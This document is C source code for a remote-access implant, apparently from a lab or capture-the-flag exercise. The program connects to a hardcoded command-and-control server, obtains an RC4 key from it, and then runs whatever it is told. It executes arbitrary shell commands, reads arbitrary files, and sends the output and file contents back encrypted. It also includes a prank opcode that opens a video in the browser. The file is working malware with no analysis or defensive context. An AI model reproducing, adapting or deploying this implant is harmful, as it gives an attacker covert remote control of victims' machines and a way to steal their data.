#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include "rc4.h"
#define KEY_LEN 16

enum opcode {
    HUHHH = 1,
    EXEC = 2,
    READ = 3,
    EXIT = 4
};


// char C2_IP[] = "127.0.0.1";
char C2_IP[] = "192.168.183.1";
int C2_PORT = 4444;

static int recv1(int sockfd, void *buffer, size_t len) {
    // printf("Starting to receive %zu bytes\n", len);
    size_t total = 0;
    unsigned char *ptr = buffer;
    while (total < len) {
        int received = recv(sockfd, (char *)ptr + total, (int)(len - total), 0);
        if (received <= 0) {
            return -1;
        }
        total += (size_t)received;
    }
    // printf("Total received: %zu bytes\n", total);
    return 0;
}

__attribute__((always_inline))
int connect_c2() {
    struct sockaddr_in server_address;
	memset(&server_address, 0, sizeof(server_address));
	server_address.sin_family = AF_INET;
	inet_pton(AF_INET, C2_IP, &server_address.sin_addr);
	server_address.sin_port = htons(C2_PORT);
	int fd;
	if ((fd = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
		return -1;
	}
	if (connect(fd, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
		return -1;
	}
    return fd;
}

__attribute__((always_inline))
char* key_exchange(int sockfd) {
    char* buf = malloc(KEY_LEN);
    if (buf == NULL) {
        return NULL;
    }
    if (recv1(sockfd, buf, KEY_LEN) < 0) {
        free(buf);
        return NULL;
    }
    // printf("Received key: ");
    // for (int i = 0; i < KEY_LEN; i++) {
    //     printf("%c", (unsigned char)buf[i]);
    // }
    // printf("\n");
    return buf;
}

int recv2(int sockfd) {
    unsigned int len;
    recv(sockfd, &len, 4, 0);
    return len;
}

char* recv3(int sockfd, char* key) {
    int len = recv2(sockfd);
    if (len <= 0) {
        return NULL;
    }
    char* buf = malloc((size_t)len + 1);
    if (buf == NULL) {
        return NULL;
    }
    if (recv1(sockfd, buf, (size_t)len) < 0) {
        free(buf);
        return NULL;
    }
    rc4_crypt(key, KEY_LEN, buf, (unsigned char*)buf, (size_t)len);
    buf[len] = '\0';
    // printf("Received command: %s\n", buf);
    return buf;
}

int send_server(int sockfd, char* key, char* buf, int len) {
    // printf("Sending response of length %d\n", len);
    rc4_crypt(key, KEY_LEN, buf, (unsigned char*)buf, len);
    send(sockfd, &len, 4, 0);
    send(sockfd, buf, len, 0);
    return 0;
}

int exec_cmd(int sockfd, char* key, char* command) {
    switch (command[0]) {
        case EXIT:
            return 1;
        case READ:
            {
                FILE* fp = fopen(command + 1, "r");
                if (fp == NULL) {
                    return -1;
                }
                fseek(fp, 0, SEEK_END);
                long fsize = ftell(fp);
                fseek(fp, 0, SEEK_SET);
                char* buffer = malloc((size_t)fsize + 1);
                if (buffer == NULL) {
                    fclose(fp);
                    return -1;
                }
                fread(buffer, 1, (size_t)fsize, fp);
                buffer[fsize] = '\0';
                fclose(fp);
                send_server(sockfd, key, buffer, (int)fsize);
                free(buffer);
                return 0;
            }
        case EXEC:
            {
                FILE* fp = popen(command + 1, "r");
                if (fp == NULL) return -1;
                size_t capacity = 1024;
                size_t size = 0;
                char* buffer = malloc(capacity);
                char* line = malloc(256);
                if (!buffer || !line) return 0;
                while (fgets(line, 256, fp) != 0) {
                    size_t len = strlen(line);
                    if (size + len >= capacity) {
                        capacity *= 2;
                        buffer = realloc(buffer, capacity);
                    }
                    strcpy(buffer + size, line);
                    size += len;
                }
                pclose(fp);
                send_server(sockfd, key, buffer, (int)size);
                free(line);
                free(buffer);
                return 0;
            }
        case HUHHH:
            system("firefox https://www.youtube.com/watch?v=dQw4w9WgXcQ &");
            return 0;
    }
}

int main() {
    int fd = connect_c2();
    if (fd < 0) {
        // printf("Failed to connect to C2 server.\n");
        return 1;
    }
    char* key = key_exchange(fd);
    if (key == NULL) {
        // printf("Key exchange failed.\n");
        close(fd);
        return 1;
    }
    // printf("Key exchange successful.\n");
    int isExit = 0;
    while (!isExit) {
        char* command = recv3(fd, key);
        if (command == NULL) {
            continue;;
        }
        isExit = exec_cmd(fd, key, command);
        free(command);
    }
    free(key);
    close(fd);
}